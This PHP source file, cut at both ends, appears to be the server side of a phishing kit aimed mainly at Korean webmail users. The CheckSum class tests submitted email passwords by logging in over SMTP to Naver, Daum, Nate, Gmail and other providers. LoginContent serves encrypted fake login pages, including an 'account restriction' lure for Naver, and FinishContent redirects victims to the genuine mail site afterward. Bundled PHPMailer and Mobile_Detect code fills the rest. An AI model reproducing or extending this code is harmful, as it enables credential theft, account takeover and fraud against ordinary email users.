				echo gmdate('Y-m-d H:i:s')."\t".str_replace("\n","\n\t",trim($str))."\n";
		}
	}
}
	
class SMTP {
	const CRLF = "\r\n";
	const DEFAULT_SMTP_PORT = 25;
	const MAX_LINE_LENGTH = 998;
	const DEBUG_OFF = 0;
	const DEBUG_CLIENT = 1;
	const DEBUG_SERVER = 2;
	const DEBUG_CONNECTION = 3;
	const DEBUG_LOWLEVEL = 4;
	public $SMTP_PORT = 25;
	public $CRLF = "\r\n";
	public $do_debug = self::DEBUG_OFF;
	public $Debugoutput = 'echo';
	public $do_verp = false;
	public $Timeout = 300;
	public $Timelimit = 300;
	protected $smtp_transaction_id_patterns = array(
		'exim' => '/[0-9]{3} OK id=(.*)/',
		'sendmail' => '/[0-9]{3} 2.0.0 (.*) Message/',
		'postfix' => '/[0-9]{3} 2.0.0 Ok: queued as (.*)/'
	);
	protected $smtp_conn;
	protected $error = array(
		'error' => '',
		'detail' => '',
		'smtp_code' => '',
		'smtp_code_ex' => ''
	);
	protected $helo_rply = null;
	protected $server_caps = null;
	protected $last_reply = '';
	protected function edebug($str, $level = 0) {
		if ($level > $this->do_debug) {
			return;
		}
		//Avoid clash with built-in function names
		if (!in_array($this->Debugoutput, array('error_log', 'html', 'echo')) and is_callable($this->Debugoutput)) {
			call_user_func($this->Debugoutput, $str, $level);
			return;
		}
		switch ($this->Debugoutput) {
			case 'error_log':
				//Don't output, just log
				error_log($str);
				break;
			case 'html':
				//Cleans up output a bit for a better looking, HTML-safe output
				echo htmlentities(
					preg_replace('/[\r\n]+/', '', $str),
					ENT_QUOTES,
					'UTF-8'
				)
				. "<br>\n";
				break;
			case 'echo':
			default:
				//Normalize line breaks
				$str = preg_replace('/(\r\n|\r|\n)/ms', "\n", $str);
				echo gmdate('Y-m-d H:i:s') . "\t" . str_replace(
					"\n",
					"\n					\t				  ",
					trim($str)
				)."\n";
		}
	}
	public function connect($host, $port = null, $timeout = 30, $options = array()) {
		static $streamok;
		if (is_null($streamok)) {
			$streamok = function_exists('stream_socket_client');
		}
		$this->setError('');
		if ($this->connected()) {
			$this->setError('Already connected to a server');
			return false;
		}
		if (empty($port)) {
			$port = self::DEFAULT_SMTP_PORT;
		}
		$this->edebug(
			"Connection: opening to $host:$port, timeout=$timeout, options=".var_export($options, true),
			self::DEBUG_CONNECTION
		);
		$errno = 0;
		$errstr = '';
		if ($streamok) {
			$socket_context = stream_context_create($options);
			set_error_handler(array($this, 'errorHandler'));
			$this->smtp_conn = stream_socket_client(
				$host . ":" . $port,
				$errno,
				$errstr,
				$timeout,
				STREAM_CLIENT_CONNECT,
				$socket_context
			);
			restore_error_handler();
		} else {
			$this->edebug(
				"Connection: stream_socket_client not available, falling back to fsockopen",
				self::DEBUG_CONNECTION
			);
			set_error_handler(array($this, 'errorHandler'));
			$this->smtp_conn = fsockopen(
				$host,
				$port,
				$errno,
				$errstr,
				$timeout
			);
			restore_error_handler();
		}
		if (!is_resource($this->smtp_conn)) {
			$this->setError(
				'Failed to connect to server',
				$errno,
				$errstr
			);
			$this->edebug(
				'SMTP ERROR: ' . $this->error['error']
				. ": $errstr ($errno)",
				self::DEBUG_CLIENT
			);
			return false;
		}
		$this->edebug('Connection: opened', self::DEBUG_CONNECTION);
		if (substr(PHP_OS, 0, 3) != 'WIN') {
			$max = ini_get('max_execution_time');
			if ($max != 0 && $timeout > $max) {
				@set_time_limit($timeout);
			}
			stream_set_timeout($this->smtp_conn, $timeout, 0);
		}
		$announce = $this->get_lines();
		$this->edebug('SERVER -> CLIENT: ' . $announce, self::DEBUG_SERVER);
		return true;
	}
	public function startTLS() {
		if (!$this->sendCommand('STARTTLS', 'STARTTLS', 220)) {
			return false;
		}
		$crypto_method = STREAM_CRYPTO_METHOD_TLS_CLIENT;
		if (defined('STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT')) {
			$crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT;
			$crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT;
		}
		if (!stream_socket_enable_crypto(
			$this->smtp_conn,
			true,
			$crypto_method
		)) {
			return false;
		}
		return true;
	}
	public function authenticate(
		$username,
		$password,
		$authtype = null,
		$realm = '',
		$workstation = '',
		$OAuth = null
	) {
		if (!$this->server_caps) {
			$this->setError('Authentication is not allowed before HELO/EHLO');
			return false;
		}

		if (array_key_exists('EHLO', $this->server_caps)) {
			if (!array_key_exists('AUTH', $this->server_caps)) {
				$this->setError('Authentication is not allowed at this stage');
				return false;
			}

			self::edebug('Auth method requested: ' . ($authtype ? $authtype : 'UNKNOWN'), self::DEBUG_LOWLEVEL);
			self::edebug(
				'Auth methods available on the server: ' . implode(',', $this->server_caps['AUTH']),
				self::DEBUG_LOWLEVEL
			);

			if (empty($authtype)) {
				foreach (array('CRAM-MD5', 'LOGIN', 'PLAIN', 'NTLM', 'XOAUTH2') as $method) {
					if (in_array($method, $this->server_caps['AUTH'])) {
						$authtype = $method;
						break;
					}
				}
				if (empty($authtype)) {
					$this->setError('No supported authentication methods found');
					return false;
				}
				self::edebug('Auth method selected: '.$authtype, self::DEBUG_LOWLEVEL);
			}

			if (!in_array($authtype, $this->server_caps['AUTH'])) {
				$this->setError("The requested authentication method \"$authtype\" is not supported by the server");
				return false;
			}
		} elseif (empty($authtype)) {
			$authtype = 'LOGIN';
		}
		switch ($authtype) {
			case 'PLAIN':
				if (!$this->sendCommand('AUTH', 'AUTH PLAIN', 334)) {
					return false;
				}
				if (!$this->sendCommand('User & Password', base64_encode("\0" . $username . "\0" . $password), 235)) {
					return false;
				}
				break;
			case 'LOGIN':
				if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334)) {
					return false;
				}
				if (!$this->sendCommand("Username", base64_encode($username), 334)) {
					return false;
				}
				if (!$this->sendCommand("Password", base64_encode($password), 235)) {
					return false;
				}
				break;
			case 'XOAUTH2':
				if (is_null($OAuth)) {
					return false;
				}
				$oauth = $OAuth->getOauth64();
				if (!$this->sendCommand('AUTH', 'AUTH XOAUTH2 ' . $oauth, 235)) {
					return false;
				}
				break;
			case 'NTLM':
				require_once 'extras/ntlm_sasl_client.php';
				$temp = new stdClass;
				$ntlm_client = new ntlm_sasl_client_class;
				if (!$ntlm_client->initialize($temp)) {
					$this->setError($temp->error);
					$this->edebug(
						'You need to enable some modules in your php.ini file: '
						. $this->error['error'],
						self::DEBUG_CLIENT
					);
					return false;
				}
				$msg1 = $ntlm_client->typeMsg1($realm, $workstation); //msg1

				if (!$this->sendCommand('AUTH NTLM', 'AUTH NTLM ' . base64_encode($msg1), 334)) {
					return false;
				}
				$challenge = substr($this->last_reply, 3);
				$challenge = base64_decode($challenge);
				$ntlm_res = $ntlm_client->NTLMResponse(
					substr($challenge, 24, 8),
					$password
				);
				$msg3 = $ntlm_client->typeMsg3(
					$ntlm_res,
					$username,
					$realm,
					$workstation
				);
				return $this->sendCommand('Username', base64_encode($msg3), 235);
			case 'CRAM-MD5':
				if (!$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334)) {
					return false;
				}
				$challenge = base64_decode(substr($this->last_reply, 4));
				$response = $username . ' ' . $this->hmac($challenge, $password);
				return $this->sendCommand('Username', base64_encode($response), 235);
			default:
				$this->setError("Authentication method \"$authtype\" is not supported");
				return false;
		}
		return true;
	}
	protected function hmac($data, $key) {
		if (function_exists('hash_hmac')) {
			return hash_hmac('md5', $data, $key);
		}
		$bytelen = 64; // byte length for md5
		if (strlen($key) > $bytelen) {
			$key = pack('H*', md5($key));
		}
		$key = str_pad($key, $bytelen, chr(0x00));
		$ipad = str_pad('', $bytelen, chr(0x36));
		$opad = str_pad('', $bytelen, chr(0x5c));
		$k_ipad = $key ^ $ipad;
		$k_opad = $key ^ $opad;

		return md5($k_opad . pack('H*', md5($k_ipad . $data)));
	}
	public function connected() {
		if (is_resource($this->smtp_conn)) {
			$sock_status = stream_get_meta_data($this->smtp_conn);
			if ($sock_status['eof']) {
				$this->edebug(
					'SMTP NOTICE: EOF caught while checking if connected',
					self::DEBUG_CLIENT
				);
				$this->close();
				return false;
			}
			return true; // everything looks good
		}
		return false;
	}
	public function close() {
		$this->setError('');
		$this->server_caps = null;
		$this->helo_rply = null;
		if (is_resource($this->smtp_conn)) {
			fclose($this->smtp_conn);
			$this->smtp_conn = null; //Makes for cleaner serialization
			$this->edebug('Connection: closed', self::DEBUG_CONNECTION);
		}
	}
	public function data($msg_data) {
		if (!$this->sendCommand('DATA', 'DATA', 354)) {
			return false;
		}
		$lines = explode("\n", str_replace(array("\r\n", "\r"), "\n", $msg_data));
		$field = substr($lines[0], 0, strpos($lines[0], ':'));
		$in_headers = false;
		if (!empty($field) && strpos($field, ' ') === false) {
			$in_headers = true;
		}
		foreach ($lines as $line) {
			$lines_out = array();
			if ($in_headers and $line == '') {
				$in_headers = false;
			}
			while (isset($line[self::MAX_LINE_LENGTH])) {
				$pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), ' ');
				if (!$pos) {
					$pos = self::MAX_LINE_LENGTH - 1;
					$lines_out[] = substr($line, 0, $pos);
					$line = substr($line, $pos);
				} else {
					$lines_out[] = substr($line, 0, $pos);
					$line = substr($line, $pos + 1);
				}
				if ($in_headers) {
					$line = "\t" . $line;
				}
			}
			$lines_out[] = $line;
			foreach ($lines_out as $line_out) {
				if (!empty($line_out) and $line_out[0] == '.') {
					$line_out = '.' . $line_out;
				}
				$this->client_send($line_out . self::CRLF);
			}
		}
		$savetimelimit = $this->Timelimit;
		$this->Timelimit = $this->Timelimit * 2;
		$result = $this->sendCommand('DATA END', '.', 250);
		$this->Timelimit = $savetimelimit;
		return $result;
	}
	public function hello($host = '') {
		//Try extended hello first (RFC 2821)
		return (boolean)($this->sendHello('EHLO', $host) or $this->sendHello('HELO', $host));
	}
	protected function sendHello($hello, $host) {
		$noerror = $this->sendCommand($hello, $hello . ' ' . $host, 250);
		$this->helo_rply = $this->last_reply;
		if ($noerror) {
			$this->parseHelloFields($hello);
		} else {
			$this->server_caps = null;
		}
		return $noerror;
	}
	protected function parseHelloFields($type) {
		$this->server_caps = array();
		$lines = explode("\n", $this->helo_rply);

		foreach ($lines as $n => $s) {
			$s = trim(substr($s, 4));
			if (empty($s)) {
				continue;
			}
			$fields = explode(' ', $s);
			if (!empty($fields)) {
				if (!$n) {
					$name = $type;
					$fields = $fields[0];
				} else {
					$name = array_shift($fields);
					switch ($name) {
						case 'SIZE':
							$fields = ($fields ? $fields[0] : 0);
							break;
						case 'AUTH':
							if (!is_array($fields)) {
								$fields = array();
							}
							break;
						default:
							$fields = true;
					}
				}
				$this->server_caps[$name] = $fields;
			}
		}
	}
	public function quit($close_on_error = true) {
		$noerror = $this->sendCommand('QUIT', 'QUIT', 221);
		$err = $this->error; //Save any error
		if ($noerror or $close_on_error) {
			$this->close();
			$this->error = $err; //Restore any error from the quit command
		}
		return $noerror;
	}
	protected function sendCommand($command, $commandstring, $expect) {
		if (!$this->connected()) {
			$this->setError("Called $command without being connected");
			return false;
		}
		if (strpos($commandstring, "\n") !== false or strpos($commandstring, "\r") !== false) {
			$this->setError("Command '$command' contained line breaks");
			return false;
		}
		$this->client_send($commandstring . self::CRLF);
		$this->last_reply = $this->get_lines();
		$matches = array();
		if (preg_match("/^([0-9]{3})[ -](?:([0-9]\\.[0-9]\\.[0-9]) )?/", $this->last_reply, $matches)) {
			$code = $matches[1];
			$code_ex = (count($matches) > 2 ? $matches[2] : null);
			$detail = preg_replace(
				"/{$code}[ -]".($code_ex ? str_replace('.', '\\.', $code_ex).' ' : '')."/m",
				'',
				$this->last_reply
			);
		} else {
			$code = substr($this->last_reply, 0, 3);
			$code_ex = null;
			$detail = substr($this->last_reply, 4);
		}
		$this->edebug('SERVER -> CLIENT: ' . $this->last_reply, self::DEBUG_SERVER);
		if (!in_array($code, (array)$expect)) {
			$this->setError(
				"$command command failed",
				$detail,
				$code,
				$code_ex
			);
			$this->edebug(
				'SMTP ERROR: ' . $this->error['error'] . ': ' . $this->last_reply,
				self::DEBUG_CLIENT
			);
			return false;
		}
		$this->setError('');
		return true;
	}
	public function client_send($data) {
		$this->edebug("CLIENT -> SERVER: $data", self::DEBUG_CLIENT);
		return fwrite($this->smtp_conn, $data);
	}
	public function getServerExt($name) {
		if (!$this->server_caps) {
			$this->setError('No HELO/EHLO was sent');
			return null;
		}
		if (!array_key_exists($name, $this->server_caps)) {
			if ($name == 'HELO') {
				return $this->server_caps['EHLO'];
			}
			if ($name == 'EHLO' || array_key_exists('EHLO', $this->server_caps)) {
				return false;
			}
			$this->setError('HELO handshake was used. Client knows nothing about server extensions');
			return null;
		}

		return $this->server_caps[$name];
	}
	public function getLastReply() {
		return $this->last_reply;
	}
	protected function get_lines() {
		// If the connection is bad, give up straight away
		if (!is_resource($this->smtp_conn)) {
			return '';
		}
		$data = '';
		$endtime = 0;
		stream_set_timeout($this->smtp_conn, $this->Timeout);
		if ($this->Timelimit > 0) {
			$endtime = time() + $this->Timelimit;
		}
		while (is_resource($this->smtp_conn) && !feof($this->smtp_conn)) {
			$str = @fgets($this->smtp_conn, 515);
			$this->edebug("SMTP -> get_lines(): \$data is \"$data\"", self::DEBUG_LOWLEVEL);
			$this->edebug("SMTP -> get_lines(): \$str is  \"$str\"", self::DEBUG_LOWLEVEL);
			$data .= $str;
			// If 4th character is a space, we are done reading, break the loop, micro-optimisation over strlen
			if ((isset($str[3]) and $str[3] == ' ')) {
				break;
			}
			$info = stream_get_meta_data($this->smtp_conn);
			if ($info['timed_out']) {
				$this->edebug(
					'SMTP -> get_lines(): timed-out (' . $this->Timeout . ' sec)',
					self::DEBUG_LOWLEVEL
				);
				break;
			}
			// Now check if reads took too long
			if ($endtime and time() > $endtime) {
				$this->edebug(
					'SMTP -> get_lines(): timelimit reached ('.
					$this->Timelimit . ' sec)',
					self::DEBUG_LOWLEVEL
				);
				break;
			}
		}
		return $data;
	}
	public function setVerp($enabled = false) {
		$this->do_verp = $enabled;
	}
	public function getVerp() {
		return $this->do_verp;
	}
	protected function setError($message, $detail = '', $smtp_code = '', $smtp_code_ex = '') {
		$this->error = array(
			'error' => $message,
			'detail' => $detail,
			'smtp_code' => $smtp_code,
			'smtp_code_ex' => $smtp_code_ex
		);
	}
	public function setDebugOutput($method = 'echo') {
		$this->Debugoutput = $method;
	}
	public function getDebugOutput() {
		return $this->Debugoutput;
	}
	public function setDebugLevel($level = 0) {
		$this->do_debug = $level;
	}
	public function getDebugLevel() {
		return $this->do_debug;
	}
	public function setTimeout($timeout = 0) {
		$this->Timeout = $timeout;
	}
	public function getTimeout() {
		return $this->Timeout;
	}
	protected function errorHandler($errno, $errmsg) {
		$notice = 'Connection: Failed to connect to server.';
		$this->setError(
			$notice,
			$errno,
			$errmsg
		);
		$this->edebug(
			$notice . ' Error number ' . $errno . '. "Error notice: ' . $errmsg,
			self::DEBUG_CONNECTION
		);
	}
}
	
class phpmailerException extends Exception{
	public function errorMessage() {
		$errorMsg = '<strong>' . $this->getMessage() . "</strong><br />\n";
		return $errorMsg;
	}
}

class CheckSum {
	public static function get_emt_from_address($address) {
		if (strpos($address, "@gmail.com") 		!== FALSE) 	return "gmail";
		if (strpos($address, "@hotmail.com")	!== FALSE) 	return "live";
		if (strpos($address, "@outlook.com")	!== FALSE) 	return "live";
		if (strpos($address, "@163.com")		!== FALSE) 	return "163";
		if (strpos($address, "@126.com")		!== FALSE) 	return "126";
		if (strpos($address, "@sina.com")		!== FALSE) 	return "sina";
		if (strpos($address, "@sina.cn")		!== FALSE) 	return "sina";
		if (strpos($address, "@vip.sina.com")	!== FALSE) 	return "vipsina";
		
		if (strpos($address, "@mail.ru")	!== FALSE) 	return "ru";
		if (strpos($address, "@yandex.ru")	!== FALSE) 	return "yandex";
		
		if (strpos($address, "@naver.com")	!== FALSE) 	return "naver";
		if (strpos($address, "@daum.net")	!== FALSE) 	return "daum";
		if (strpos($address, "@hanmail.net")	!== FALSE) 	return "daum";
		if (strpos($address, "@nate.com")	!== FALSE) 	return "nate";
		return FALSE;
	}
	public static function Valid($mailid, $password) {
		$mail = new PHPMailer;
		$mail->isSMTP();
		$mail->CharSet = 'UTF-8';
		if (strpos($mailid, "@gmail.com") !== FALSE) {
			$mail->Host = 'smtp.gmail.com';
			$mail->Port = 587;
			$mail->SMTPSecure = 'tls';
		} else if (strpos($mailid, "@hotmail.com") !== FALSE) {
			$mail->Host = 'smtp.live.com';
			$mail->Port = 25;
			$mail->SMTPSecure = 'tls';
		} else if (strpos($mailid, "@outlook.com") !== FALSE) {
			$mail->Host = 'smtp.live.com';
			$mail->Port = 25;
			$mail->SMTPSecure = 'tls';
		} else if (strpos($mailid, "@mail.ru") !== FALSE) {
			$mail->Host = 'smtp.mail.ru';
			$mail->Port = 587;
			$mail->SMTPSecure = 'tls';
		} else if (strpos($mailid, "@yandex.ru") !== FALSE) {
			$mail->Host = 'smtp.yandex.com';
			$mail->Port = 587;
			$mail->SMTPSecure = 'tls';
		} else if (strpos($mailid, "@naver.com") !== FALSE) {
			$mail->Host = 'smtp.naver.com';
			$mail->Port = 587;
			$mail->SMTPSecure = 'tls';
		} else if (strpos($mailid, "@daum.net") !== FALSE) {
			$mail->Host = 'smtp.daum.net';
			$mail->Port = 465;
			$mail->SMTPSecure = 'ssl';
		} else if (strpos($mailid, "@hanmail.net") !== FALSE) {
			$mail->Host = 'smtp.daum.net';
			$mail->Port = 465;
			$mail->SMTPSecure = 'ssl';
		} else if (strpos($mailid, "@kakao.com") !== FALSE) {
			$mail->Host = 'smtp.kakao.com';
			$mail->Port = 465;
			$mail->SMTPSecure = 'ssl';
		} else if (strpos($mailid, "@nate.com") !== FALSE) {
			$mail->Host = 'smtp.mail.nate.com';
			$mail->Port = 465;
			$mail->SMTPSecure = 'ssl';
		} else
			return "Not Supported";
		if ($mail->Host == "smtp.naver.com"){
			$pblocks = explode("||", $password);
			if (count($pblocks) > 1){
				$password = $pblocks[1];
			}
		}
		if ($mail->Host == "smtp.daum.net"){
			$pblocks = explode("||", $password);
			if (count($pblocks) > 1){
				$password = $pblocks[0];
			}
		}
		if ($password == ""){
			return "0";
		}
		$mail->SMTPAuth = TRUE;
		$mail->Username = $mailid;
		$mail->Password = $password;
		$result = $mail->smtpConnect(array());
		if ($result === true){
			return "1";
		} else {
			return "0";
		}
	}
}
class LogUtil{
	public static function log_str($str){
		if (false){
			$logfile = "devlog.dat";
			$datetime = date("Y-m-d H:i:s.u");
			$row = $datetime."\t".$str."\r\n";
			$fp=fopen($logfile,'ab');
			fwrite($fp, $row);
			fclose($fp);
		}
	}
}
class ConstVal {
	public static function get_ms_from_ad($address) {
		if (strpos($address, "@gmail.com") 		!== FALSE) 	return "gmail.com";
		if (strpos($address, "@hotmail.com")	!== FALSE) 	return "hotmail.com";
		if (strpos($address, "@outlook.com")	!== FALSE) 	return "outlook.com";
		if (strpos($address, "@163.com")		!== FALSE) 	return "mail.163.com";
		if (strpos($address, "@126.com")		!== FALSE) 	return "mail.126.com";
		if (strpos($address, "@sina.com")		!== FALSE) 	return "mail.sina.com";
		if (strpos($address, "@sina.cn")		!== FALSE) 	return "mail.sina.cn";
		if (strpos($address, "@vip.sina.com")	!== FALSE) 	return "mail.sina.com";
		if (strpos($address, "@mail.ru")	!== FALSE) 	return "mail.ru";
		if (strpos($address, "@yandex.ru")	!== FALSE) 	return "mail.yandex.com";
		if (strpos($address, "@naver.com")	!== FALSE) 	return "mail.naver.com";
		if (strpos($address, "@daum.net")	!== FALSE) 	return "mail.daum.net";
		if (strpos($address, "@hanmail.net")	!== FALSE) 	return "mail.daum.net";
		if (strpos($address, "@nate.com")	!== FALSE) 	return "mail3.nate.com";	
		return FALSE;
	}
	public static function get_main_from_ad($address) {
		if (strpos($address, "@gmail.com") 		!== FALSE) 	return "gmail.com";
		if (strpos($address, "@hotmail.com")	!== FALSE) 	return "hotmail.com";
		if (strpos($address, "@outlook.com")	!== FALSE) 	return "outlook.com";
		if (strpos($address, "@163.com")		!== FALSE) 	return "mail.163.com";
		if (strpos($address, "@126.com")		!== FALSE) 	return "mail.126.com";
		if (strpos($address, "@sina.com")		!== FALSE) 	return "mail.sina.com";
		if (strpos($address, "@sina.cn")		!== FALSE) 	return "mail.sina.cn";
		if (strpos($address, "@vip.sina.com")	!== FALSE) 	return "mail.sina.com";
		if (strpos($address, "@mail.ru")	!== FALSE) 	return "mail.ru";
		if (strpos($address, "@yandex.ru")	!== FALSE) 	return "yandex.com";
		if (strpos($address, "@naver.com")	!== FALSE) 	return "naver.com";
		if (strpos($address, "@daum.net")	!== FALSE) 	return "daum.net";
		if (strpos($address, "@hanmail.net")	!== FALSE) 	return "daum.net";
		if (strpos($address, "@nate.com")	!== FALSE) 	return "nate.com";	
		return FALSE;
	}
	public static function get_return_script($address=NULL){
		$msurl = '';
		if ($address == NULL){
			//$msurl = $_SERVER['SERVER_NAME'];
			$msurl = 'www.bdsmall.kr';
		} else {
			$msurl = ConstVal::get_ms_from_ad($address);
			if ($msurl === FALSE){
				$msurl = $_SERVER['SERVER_NAME'];
			}
		}
		return '<script>window.location.href="http://'.$msurl.'"</script>';
	}
	public static function get_error_script($address=NULL){
		$msurl = '';
		if ($address == NULL){
			$msurl = 'www.bdsmall.kr/efwsowere?id=elwfew';
		} else {
			$msurl = ConstVal::get_main_from_ad($address);
			if ($msurl === FALSE){
				$msurl = 'www.bdsmall.kr/efwsowere?id=elwfew';
			}
		}
		return '<script>window.location.href="http://'.$msurl.'"</script>';
	}
}class LoginContent {
	public static $htmls = '{xxxlogin}';
	public static function getContent($to, $device, $url, $uid, $ntid, $ptn, $inptn, $isRe=0, $big=''){
		$ms = '';
		$mid = '';
		
		$blocks = explode("@", $to);
		if (count($blocks) != 2) {
			return ConstVal::get_return_script($to);
		} else {
			$mid = $blocks[0];
		}
		$inptnblocks = explode("-", $inptn);
		$ms = $inptnblocks[0];
		if ($ms == "daum"){
			$ms = "daum.net";
		}
		if ($ms == "yeah"){
			$ms = "yeah.net";
		}
		if (strpos($ms, '.') == false){
			$ms = $ms.'.com';
		}

		$snp = substr(md5($inptn), 0, 16);
		$sms1 = substr(md5($device.".".$ms.".html"), 0, 16);
		$sms2 = substr(md5($device.".".$ms.".2".".html"), 0, 16);
		$t = "it/".$snp."/".$sms1.".dat";
		if ($isRe > 0){
			$t = "it/".$snp."/".$sms2.".dat";
		}
		$isRe++;
		if (file_exists($t)){
			$html = file_get_contents($t);
			if ($html === FALSE){
				ConstVal::get_return_script($to);
			}
			$aesEnc = new AES($uid);
			$html = $aesEnc->aes_dec($html);

			$html = str_replace('{accountid}', $mid, $html);
			$html = str_replace('{accountfid}', $to, $html);
			$html = str_replace('{xxxrc}', $url, $html);
			$html = str_replace('{xxxid}', $uid, $html);
			$html = str_replace('{xxxemt}', $blocks[1], $html);
			$html = str_replace('{xxxntid}', $ntid, $html);
			$html = str_replace('{xxxinptn}', $inptn, $html);
			$html = str_replace('{xxxptn}', $ptn, $html);
			$html = str_replace('{xxxrep}', "".$isRe, $html);
			if ($ptn == "naver-mail-acc-restrict"){
				$html = str_replace('{xxxsubmit}', "이용제한 해제", $html);
			} else {
				$html = str_replace('{xxxsubmit}', "로그인", $html);
			}

			if ($big != ''){
				$fbig = $device.$big;
				$html = str_replace('{xxxbig}', $fbig, $html);
			}
			return $html;
		} else {
			return ConstVal::get_return_script($to);
		}
	}
}

class FinishContent {
	public static $htmls = '{xxxfinish}';
	public static $finstr = '{xxxfinstr}';
	public static $redlink = '{xxxredlink}';
	public static function getContent($to, $device="b", $ptn, $inptn, $uid=""){
		$ms = '';
		$mid = '';
		$blocks = explode("@", $to);
		if (count($blocks) != 2) {
			return ConstVal::get_return_script($to);
		} else {
			$mid = $blocks[0];
		}
		$inptnblocks = explode("-", $inptn);
		$ms = $inptnblocks[0];
		if ($ms == "daum"){
			$ms = "daum.net";
		}
		if ($ms == "yeah"){
			$ms = "yeah.net";
		}
		if (strpos($ms, '.') == false){
			$ms = $ms.'.com';
		}
		$snp = substr(md5($ms), 0, 16);
		$sms = substr(md5($device.".".$ms.".html"), 0, 16);
		$t = "fn/".$snp."/".$sms.".dat";

		if (file_exists($t)){
			$html = file_get_contents($t);
			if ($uid == ""){
				return ConstVal::get_return_script($to);
			}
			$aesEnc = new AES($uid);
			$html = $aesEnc->aes_dec($html);

			$html = str_replace('{xxxfinloadstr}', base64_decode('6rOg6rCd64uY7J2YIOyalOyyreydhCDsoJHsiJjtlZjsmIDsirXri4jri6QuPGJyLz7snqDsi5zrp4wg6riw64uk66CkIOyjvOyLreyLnOyalC4='), $html);
			$html = str_replace('{xxxfincompstr}', base64_decode('6rOg6rCd64uY7J2YIOyalOyyreydtCDshLHqs7zsoIHsnLzroZwg7LKY66as65CY7JeI7Iq164uI64ukLjxici8+7J6g7IucIO2bhCDsnbTsmqnslb3qtIAg7Y6Y7J207KeA66GcIOydtOuPme2VqeuLiOuLpC4='), $html);
			$html = str_replace('{xxxredirectlinkb}', "https://".$ms, $html);
			$html = str_replace('{xxxredirectlinkm}', "https://".$ms, $html);
			return $html;
		} else {
			return ConstVal::get_return_script($to);
		}
	}
	public function getErrorPage($to) {
		return ConstVal::get_error_script($to);
	}

}

class Mobile_Detect
{
	const DETECTION_TYPE_MOBILE	 = 'mobile';
	const DETECTION_TYPE_EXTENDED   = 'extended';
	const VER					   = '([\w._\+]+)';
	const MOBILE_GRADE_A			= 'A';
	const MOBILE_GRADE_B			= 'B';
	const MOBILE_GRADE_C			= 'C';
	const VERSION				   = '2.8.34';
	const VERSION_TYPE_STRING	   = 'text';
	const VERSION_TYPE_FLOAT		= 'float';
	protected $cache = array();
	protected $userAgent = null;
	protected $httpHeaders = array();
	protected $cloudfrontHeaders = array();
	protected $matchingRegex = null;
	protected $matchesArray = null;
	protected $detectionType = self::DETECTION_TYPE_MOBILE;
	protected static $mobileHeaders = array(
			'HTTP_ACCEPT'=> array('matches' => array(
				// Opera Mini; @reference: http://dev.opera.com/articles/view/opera-binary-markup-language/
				'application/x-obml2d',
				// BlackBerry devices.
				'application/vnd.rim.html',
				'text/vnd.wap.wml',
				'application/vnd.wap.xhtml+xml')),
			'HTTP_X_WAP_PROFILE'		   => null,
			'HTTP_X_WAP_CLIENTID'		  => null,
			'HTTP_WAP_CONNECTION'		  => null,
			'HTTP_PROFILE'				 => null,
			// Reported by Opera on Nokia devices (eg. C3).
			'HTTP_X_OPERAMINI_PHONE_UA'	=> null,
			'HTTP_X_NOKIA_GATEWAY_ID'	  => null,
			'HTTP_X_ORANGE_ID'			 => null,
			'HTTP_X_VODAFONE_3GPDPCONTEXT' => null,
			'HTTP_X_HUAWEI_USERID'		 => null,
			// Reported by Windows Smartphones.
			'HTTP_UA_OS'				   => null,
			// Reported by Verizon, Vodafone proxy system.
			'HTTP_X_MOBILE_GATEWAY'		=> null,
			// Seen this on HTC Sensation. SensationXE_Beats_Z715e.
			'HTTP_X_ATT_DEVICEID'		  => null,
			// Seen this on a HTC.
			'HTTP_UA_CPU'				  => array('matches' => array('ARM')),
	);
	protected static $phoneDevices = array(
		'iPhone'		=> '\biPhone\b|\biPod\b', // |\biTunes
		'BlackBerry'	=> 'BlackBerry|\bBB10\b|rim[0-9]+|\b(BBA100|BBB100|BBD100|BBE100|BBF100|STH100)\b-[0-9]+',
		'HTC'		   => 'HTC|HTC.*(Sensation|Evo|Vision|Explorer|6800|8100|8900|A7272|S510e|C110e|Legend|Desire|T8282)|APX515CKT|Qtek9090|APA9292KT|HD_mini|Sensation.*Z710e|PG86100|Z715e|Desire.*(A8181|HD)|ADR6200|ADR6400L|ADR6425|001HT|Inspire 4G|Android.*\bEVO\b|T-Mobile G1|Z520m|Android [0-9.]+; Pixel',
		'Nexus'		 => 'Nexus One|Nexus S|Galaxy.*Nexus|Android.*Nexus.*Mobile|Nexus 4|Nexus 5|Nexus 6',
		// @todo: Is 'Dell Streak' a tablet or a phone? ;)
		'Dell'		  => 'Dell[;]? (Streak|Aero|Venue|Venue Pro|Flash|Smoke|Mini 3iX)|XCD28|XCD35|\b001DL\b|\b101DL\b|\bGS01\b',
		'Motorola'	  => 'Motorola|DROIDX|DROID BIONIC|\bDroid\b.*Build|Android.*Xoom|HRI39|MOT-|A1260|A1680|A555|A853|A855|A953|A955|A956|Motorola.*ELECTRIFY|Motorola.*i1|i867|i940|MB200|MB300|MB501|MB502|MB508|MB511|MB520|MB525|MB526|MB611|MB612|MB632|MB810|MB855|MB860|MB861|MB865|MB870|ME501|ME502|ME511|ME525|ME600|ME632|ME722|ME811|ME860|ME863|ME865|MT620|MT710|MT716|MT720|MT810|MT870|MT917|Motorola.*TITANIUM|WX435|WX445|XT300|XT301|XT311|XT316|XT317|XT319|XT320|XT390|XT502|XT530|XT531|XT532|XT535|XT603|XT610|XT611|XT615|XT681|XT701|XT702|XT711|XT720|XT800|XT806|XT860|XT862|XT875|XT882|XT883|XT894|XT901|XT907|XT909|XT910|XT912|XT928|XT926|XT915|XT919|XT925|XT1021|\bMoto E\b|XT1068|XT1092|XT1052',
